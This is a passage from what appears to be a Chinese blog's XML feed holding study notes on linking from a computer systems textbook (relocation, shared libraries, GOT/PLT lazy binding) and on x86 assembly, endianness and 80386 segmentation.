src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201222135253203.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201222135253203.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201222135253203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -o main main.c all.a</span><br></pre></td></tr></table></figure><p><code>-static</code>使编译器，构造一个完全链接可执行目标文件，可以独立载入内存运行，加载时无需更进一步的链接。</p><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201222135905772.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/image-20201222135905772.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201222135905772" style="zoom:67%;"><p>链接器运行时，由于判定了<code>main.c</code>中只引用了a.o中的符号，所以只复制了a.o到可执行文件，因为程序不引用任何由b.o定义的符号，所以链接器不会复制这个模块到可执行文件。</p><h1 id="5-重定位"><a href="#5-重定位" class="headerlink" title="5.重定位"></a>5.重定位</h1><p>链接器完成了符号解析这一步，把代码中每个符号引用和正好一个符号定义(即它一个输入目标模块中的一个符号表条目)关联起来，此时，链接器就知道它的输入目标模块的代码节和数据节的确切大小，即下一步进行重定位操作。</p><p><strong>在这个重定位步骤中，将合并输入模块，并为每个符号分配运行时的地址，重定位一共两步：</strong></p><h5 id="1-重定位节和符号定义"><a href="#1-重定位节和符号定义" class="headerlink" title="1.重定位节和符号定义"></a>1.重定位节和符号定义</h5><p>链接器将所有输入模块相同类型的节合并成同一类型的新的聚合节(如各个模块的.data节被全部合并成一个节，这个节成为输出可执行目标文件的.data节)。<strong>接下来</strong>，链接器重新将新的内存地址赋值给这些新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块定义的每个地址。该重定位节和符号定义的作用是：程序中的每条指令和全局变量都有唯一的运行时的内存地址。</p><h5 id="2-重定位节总的符号引用"><a href="#2-重定位节总的符号引用" class="headerlink" title="2.重定位节总的符号引用"></a>2.重定位节总的符号引用</h5><p>链接器修改代码节和数据节中对每个符号的引用，使得运行指向正确的地址。主要依赖的是<strong>重定位条目</strong>的数据结构。</p><p>代码的重定位条目放在<code>.rel.text</code>中；已初始化数据的重定条目放在<code>.rel.data</code>中</p><p><strong>重定位条目</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">long</span> offset; <span class="comment">//offset是需要被修改的引用的节偏移</span></span><br><span class="line">    <span class="keyword">long</span> type:<span class="number">32</span>; <span class="comment">//symbol标识 被修改引用应该指向的符号</span></span><br><span class="line">     symbol:<span class="number">32</span>; <span class="comment">//type告知链接器如何修改新的引用</span></span><br><span class="line">    <span class="keyword">long</span> addend; <span class="comment">//有符号常数，一些重定位要使用它对被修改引用的值做偏移调整</span></span><br><span class="line">&#125;Elf64_Rela;</span><br></pre></td></tr></table></figure><p>两种基本的重定位类型：</p><ul><li>R_X86_64_PC32：重定位一个使用32位PC相对地址的引用。将PC或者IP中指令中的编码32位值加上PC的当前运行的值，得到有效地址(如函数的运行地址)，PC中值通常是下一条指令在内存中的地址。</li><li>R_X86_64_32：重定位一个使用32位PC绝对地址引用。通过<strong>绝对寻址</strong>，CPU直接使用在指令中编码32位值作为有效地址。</li></ul><p><strong>链接器重定位算法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">foreach section s&#123;</span><br><span class="line">foreach relocation entry r&#123;</span><br><span class="line">refptr= s + r.offset <span class="comment">//计算出在当前节需要更新值的地址</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(r.type==R_X86_64_PC32)&#123;</span><br><span class="line">            refaddr=ADDR(s)+r.offset <span class="comment">//引用运行时的地址</span></span><br><span class="line">            *refptr=(<span class="keyword">unsigned</span>)(ADDR(r.symbol)+r.append-refaddr) <span class="comment">//更新引用</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(r.type==R_x86_64_32)&#123;</span><br><span class="line">         *refptr=(<span class="keyword">unsigned</span>)(ADDR(r.symbol)+r.addend);  </span><br><span class="line">        &#125;</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设下面的<strong>相对重定位条目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e: e8 “00” 00 00 00      callq 13&lt;main+0x13&gt;</span><br><span class="line">  f:R_X86_64_PC32 sum-0x4</span><br></pre></td></tr></table></figure><p>可以由上表读出其中<code>offset=0xf</code>、<code>type=R_X86_64_PC32</code>、<code>symbol=sum</code>、<code>addend=-4</code></p><p>假设该代码段节的地址为<code>s=0x4004d0</code>，<code>ADDR(symbol)=0x4004e8</code>那么其实<code>refaddr=0x4004d0+0xf=0x4004df</code>就到了上面代码段加双引用号的位置，最后更新这个地方的值<code>*refptr=0x4004e8+(-4)-0x4004df</code>得到函数的偏移量为<code>0x5</code>，更新值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4004de: e8 “05” 00 00 00      callq 4004e8&lt;sum&gt;</span><br><span class="line">4004e3</span><br></pre></td></tr></table></figure><p>将要运行该指令时，由于PC寄存器指向的是下条指令，将PC寄存器中的值<code>0x4004e3</code>加上该值<code>0x5</code>就是函数的入口的地址<code>40004e8</code>；<code>e8是call命令</code></p><p><strong>绝对重定位条目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9: bf &quot;00&quot; 00 00 00      mov $0x0,%edi</span><br><span class="line">  a:R_X86_64_32 array</span><br></pre></td></tr></table></figure><p>可以由上表读出其中<code>offse=0xf、type=R_X86_64_32、symbol=array、addend=0</code>那么此时的ADDR(symbol)已经确定，直接将该值赋值给<code>*refptr=ADDR(S)+offset</code>，也就是双引号的开始的位置</p><h1 id="6-可执行目标文件"><a href="#6-可执行目标文件" class="headerlink" title="6.可执行目标文件"></a>6.可执行目标文件</h1><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-865dbae0f07c3f10.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-865dbae0f07c3f10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom:75%;"><h1 id="7-动态链接共享库"><a href="#7-动态链接共享库" class="headerlink" title="7.动态链接共享库"></a>7.动态链接共享库</h1><h3 id="1-生成和使用共享库"><a href="#1-生成和使用共享库" class="headerlink" title="1.生成和使用共享库"></a>1.生成和使用共享库</h3><p>共享库是一个目标模块，在运行和加载时，可以记载任意的内存地址，并和一个内存中的程序链接起来。这个过程称为动态链接，是由一个动态链接器的程序来执行。共享库也称为共享目标，在LINUX系统中通常用.so后缀表示，在windows使用.dll文件表示。</p><p><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-5b2b951f27e58469.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-5b2b951f27e58469.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>共享库首先在任何系统中只有一个<code>.so</code>文件，所有引用该库的可执行目标文件共享这个，<code>.so</code>文件中的代码和数据，不是像静态库的内容那样被赋值和嵌入到引用他们的执行文件；在内存中，一个共享库的<code>.text</code>节的一个副本可以被不同的正在运行的进程共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o math.so add.c sub.c </span><br></pre></td></tr></table></figure><p>其中<code>-fpic</code>选项指示编译器生成与位置无关的代码，<code>-shared</code>选项指示链接器创建一个共享的目标文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c ./math.so </span><br></pre></td></tr></table></figure><p>创建一个可执行的目标文件main，而此文件的形式使得它在运行时可以跟math.so文件链接</p><p><strong>加载器不会像静态文件那样将控制传递给应用，而是加载和运行这个动态链接器，链接器执行下面的重定位完成链接任务：</strong></p><ul><li><p>重定位lib.so的文本和数据到某个内存段</p></li><li><p>重定位math.so的文本和数据到另一个内存段</p></li><li><p>重定位main中所有对由libc.so和math.so定义的符号的引用</p></li></ul><h3 id="2-与位置无关代码"><a href="#2-与位置无关代码" class="headerlink" title="2.与位置无关代码"></a>2.与位置无关代码</h3><p>可以加载而无需重定位的代码称为<strong>位置无关代码（PIC）。</strong></p><p>在一个X86_64系统中，对同一个目标模块中符号的引用是不需要特殊处理使之成为PIC。可以用PC相对寻址来编译这些引用，构造目标文件时由静态链接器重定位，对共享模块定义的外部过程和对全局变量的引用需要一些特殊的技巧。</p><h5 id="1-PIC数据引用"><a href="#1-PIC数据引用" class="headerlink" title="1.PIC数据引用"></a>1.PIC数据引用</h5><p>无论内存在何处加载一个目标模块(包括共享模块)，数据段与代码段的距离总是保持不变(即在内存的相对位置保持不变)，全局变量PIC，它在数据段开始的地方创建一个<strong>全局偏移量表(Global Offset Table，GOT)<strong>。在GOT中，每个被这个模块引用的全局数据目标(函数或全局变量)都有8个字节的条目。</strong>编译器还为GOT中每个条目生成一个重定位记录</strong>。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含目标的正确<strong>绝对地址</strong>。每个引用全局目标的目标模块都有自己GOT.</p><h5 id="2-PIC函数调用"><a href="#2-PIC函数调用" class="headerlink" title="2.PIC函数调用"></a>2.PIC函数调用</h5><p>对于数量庞大的库文件来说，把函数地址的解析推迟到实际调用的地方，<strong>延迟绑定</strong>能避免动态链接器在加载时进行成百上千个其实并不需要的重定位。第一次调用过程的运行开销很大，但是其后的每次调用只会花费一条指令和一个间接的内存引用。</p><p>延迟规定是两个数据结构：GOT和过**程链接表(Procedire Linkage Table，PLT)**。</p><p><strong>GOT表示数据段的一部分；PLT是代码段的一部分</strong></p><ul><li><p>PLT</p><p>PLT是一个代码数组，其中每个条目是16字节代码，PLT[0]是一个特殊条目，跳转到动态链接器中。每个被可执行程序调用的库函数都有自己的PLT条目，每个条目负责调用一个具体的函数。PLT[1]调用启动函数(_ _libc_start_main)，由该函数来初始化执行环境，调用main函数并且处理返回值。从PLT[2]开始的条目为用于调用其他模块的函数。</p></li><li><p>GOT</p><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-a60c39c40a674341.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/3010486-a60c39c40a674341.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom: 67%;"><p>GOT是一个数组，其中的每个条目是8字节代码。和PLT联合使用，GOT[0]和GOT[1]包含动态链接器在解析函数地址时会使用到的信息。GOT[2]是动态链接器在<code>ld-linux.so</code>模块中的入口点。其余的每个条目对应于一个被调用的函数，其地址需要在运行时被解析。每个条目都有想对应的PLT条目。<strong>初始时，每个GOT条目都指向对应PLT条目的第二条指令。</strong></p></li></ul><p>延迟绑定调用的步骤：</p><p>第一次调用：首先控制流先到PLT[4]中，假设PLT[4]如下，其首行命令跳转的目标是<strong>对应的GOT表的条目</strong>，但此时的GOT表的条目对应地址是PLT[4]第二条的push，push完之后执行104b地址的命令，跳转到了PLT[0]继续压参数跳到GOT[2]解析地址然后往GOT表中填入绝对地址</p><p>第二次调用：跳转PLT-&gt;GOT对应的条目就可直接拿到函数的绝对地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000001040 &lt;all_add@plt&gt;:</span><br><span class="line">    1040:ff 25 da 2f 00 00    jmpq   *0x2fda(%rip)        # 4020 &lt;all_add&gt;</span><br><span class="line">    1046:68 01 00 00 00       pushq  $0x1</span><br><span class="line">    104b:e9 d0 ff ff ff       jmpq   1020 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><img src="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/got-8.png" class="lazyload" data-srcset="/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E9%93%BE%E6%8E%A5/got-8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom: 67%;">]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="1-指令集-CISC-RISC"><a href="#1-指令集-CISC-RISC" class="headerlink" title="1.指令集(CISC RISC)"></a><strong>1.指令集</strong>(CISC RISC)</h1><p><strong>x86指令集：</strong></p><ul><li><p><strong>向下兼容；</strong></p></li><li><p><strong>变长指令：1-15字节，多数为2-3字节长度；</strong></p></li><li><p><strong>多种寻址方式(可访问不对齐的内存地址)<img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215134155576.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215134155576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215134155576" style="zoom:50%;"></strong></p></li><li><p><strong>指令集的通用寄存器个数有限</strong></p><p><strong>X86-32系统下拥有8个通用寄存器(X86-64扩张到16个)</strong></p></li><li><p><strong>至多<code>只有一个操作数在内存</code>中，另一个操作数为立即数或者寄存器</strong></p></li></ul><h1 id="2-数的机器表示"><a href="#2-数的机器表示" class="headerlink" title="2.数的机器表示"></a>2.数的机器表示</h1><ul><li><p><strong>机器字长：</strong>一般指计算机进行一次整数运算所能处理的二进制数据的位数(包括数据地址长度)</p></li><li><p><strong>地址按照字节来定位：</strong>机器字中第一个字节的地址；相邻机器字的地址相差4或者8字节<img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215135843106.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215135843106.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215135843106" style="zoom:33%;"></p></li><li><p><strong>机器字内的各个字节的排列：</strong>小端法：机器在内存中按照从最低有效字节到最高有效字节的顺序存储对象；大端法：机器在内存中按照从最高有效字节到最低有效字节的顺序存储对象</p></li></ul><p>存储变量<code>0x1234567</code>，高位字节的十六进制值为0x01，而低位字节值为0x67</p><p>大端法（低位地址存数据高位；高位地址存数据低位）：<img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/20190624162418741.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/20190624162418741.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>小端法（低位地址存数据低位；高位地址存数据高位）：<img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/20190624162727576.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/20190624162727576.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><strong>小端模式低存低 高存高</strong></p><p>Windows Linux Android IOS基本都是运行小端模式</p><ul><li><strong>有符号数和无符号进行比较的时候是将bit位转化为无符号再进行比较</strong></li></ul><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215145148744.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201215145148744.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201215145148744"></p><h1 id="3-80386三种工作模式"><a href="#3-80386三种工作模式" class="headerlink" title="3.80386三种工作模式"></a>3.80386三种工作模式</h1><ul><li><strong>实模式：</strong>操作相当于一个可进行32位快速运算的8086</li><li><strong>保护模式：</strong>是80x86设计目标全部达到的工作模式，通过对程序使用的存储区采用<strong>分段、分页的存储管理机制</strong>，通过分级使用、互不干扰的的保护目的。能为每个任务提供一台虚拟处理器，使得各个任务单独执行，快速切换。</li><li><strong>虚拟8086模式</strong>：保护模式下同时模拟多个8086处理器</li></ul><p>通过保护模式，可以把虚拟地址空间映射到不同的物理地址空间，且在超出预设的空间范围会报错（一种保护机制的体现），且可以保证处于低特权级的代码无法访问搞特权级的数据（另外一种保护机制的体现）。 只有在保护模式下，80386的全部32位地址才能有效，<strong>可寻址高达4G字节的线性地址空间和物理地址空间</strong>，可访问64TB（有2^14^个段，每个段最大空间为2^32^字节）的虚拟地址空间，可采用分段存储管理机制和分页存储管理机制。</p><ul><li><strong>80386处理器6个段寄存器：</strong>CS DS SS ES FS GS</li></ul><p>段寄存器长度为16位，其中13位代表内存段的一个编号，称为”段选择器”。将段寄存器中的高13位值作为索引来访问该表，从而获得64位的描述符表。</p><h1 id="4-分段机制的地址转换"><a href="#4-分段机制的地址转换" class="headerlink" title="4.分段机制的地址转换"></a>4.分段机制的地址转换</h1><ul><li><strong>段选择子的结构</strong></li><li><strong>段描述符结构</strong></li></ul><p>分段机制将内存划分成以<strong>起始地址</strong>和长度限制这两个参数表示的内存块，这些内存块就称之为段。编译器把源程序编译成执行程序时用到的代码段、数据段、堆和栈等概念在这里可以与段联系起来，二者在含义上是一致的。</p><p>在保护模式下，特权级总共有4个，编号从0（最高特权）到3（最低特权）。有3种主要的资源受到保护：内存，I/O地址空间以及执行特殊机器指令的能力。在任一时刻，intel 80386 CPU都是在一个特定的特权级下运行的，从而决定了代码可以做什么，不可以做什么。这些特权级经常被称为为保护环（protection ring），最内的环（ring 0）对应于最高特权0，最外面的环（ring 3）一般给应用程序使用，对应最低特权3。在保护模式下，我们可以通过查看CS寄存器的最低两位来了解当前正在运行的处理器是处于哪个特权级。</p><p>从操作系统原理上看，编译器实际上采用基于分段的虚拟管理方式来生成执行程序的，即应用程序员看到的逻辑地址和位于计算机上的物理地址之间有映射关系，二者可以是不同的。</p><h3 id="4-1分段模式的具体硬件操作过程如下："><a href="#4-1分段模式的具体硬件操作过程如下：" class="headerlink" title="4.1分段模式的具体硬件操作过程如下："></a>4.1分段模式的具体硬件操作过程如下：</h3><ol><li><p>根据指令的内容确定应该使用的<strong>段寄存器</strong>，比如取内存指令的内存地址所对应的数据段寄存器为DS；</p></li><li><p>根据段寄存器DS的值作为选择子，以此选择子值为**<code>索引</code><strong>，在</strong>段描述符表<strong>（可理解为一个大数组）找到</strong>索引指向的段描述符**（可理解为数组中的元素）；</p></li><li><p>在段描述符中取出<strong>基地址域</strong>（段的起始地址）和<strong>地址范围域</strong>（段的长度）的值；</p></li><li><p>将指令内容确定的<strong>地址偏移</strong>，与<strong>地址范围域</strong>的值比较，确保地址偏移小于地址范围，这样是为了确保地址范围不会跨出段的范围；（第一层保护）</p></li><li><p>根据指令的性质（当前指令的CS值的低两位）确定当前指令的特权级，需要高于当前指令访问的数据段的特权级；（第二层保护）；</p></li><li><p>根据指令的性质(指令是做读还是写操作)，需要当前指令访问的数据段可读或可写；（第三层保护）</p></li><li><p>将DS指向的段描述符中<strong>基地址域</strong>的值加上指令内容中指定的访存<strong>地址段内偏移值</strong>，形成实际的物理地址（实现地址转换），发到数据地址总线上，到物理内存中寻址，并取回该地址对应的数据内容。 </p><p>分段机制涉及4个关键内容：逻辑地址（Logical Address,应用程序员看到的地址，在操作系统原理上称为虚拟地址，以后提到虚拟地址就是指逻辑地址）、物理地址（Physical Address, 实际的物理内存地址）、段描述符表（包含多个段描述符的“数组”）、段描述符（描述段的属性，及段描述符表这个“数组”中的“数组元素”）、段选择子（即<strong>段寄存器中的值</strong>，用于定位段描述符表中段描述符表项的索引）。 虚拟地址到物理地址的转换主要分以下两步：</p></li><li><p>分段地址转换：CPU把虚拟地址（由段选择子selector和段偏移offset组成）中的<strong>段选择子值</strong>作为<strong>段描述符表的索引</strong>，找到表中对应的<strong>段描述符</strong>，然后把段描述符中保存的<strong>段基址</strong>加上<strong>段偏移值</strong>，形成线性地址（Linear Address，在操作系统原理上没有直接对应的描述，在没有启动分页机制的情况下，可认为就是物理地址；如果启动了分页机制，则可理解为第二级虚拟地址）。如果不启动分页存储管理机制，则线性地址等于物理地址。</p></li><li><p>分页地址转换，这一步中把线性地址转换为物理地址。（注意：这一步是可选的，由操作系统决定是否需要。） 上述转换过程对于应用程序员来说是不可见的。线性地址空间由一维的线性地址构成，在分段机制下的线性地址空间和物理地址空间对等。线性地址32位长，线性地址空间容量为4G字节。分段机制中虚拟地址到线性地址转换转换的基本过程如下图所示。</p></li></ol><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/3.15.1.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/3.15.1.png" 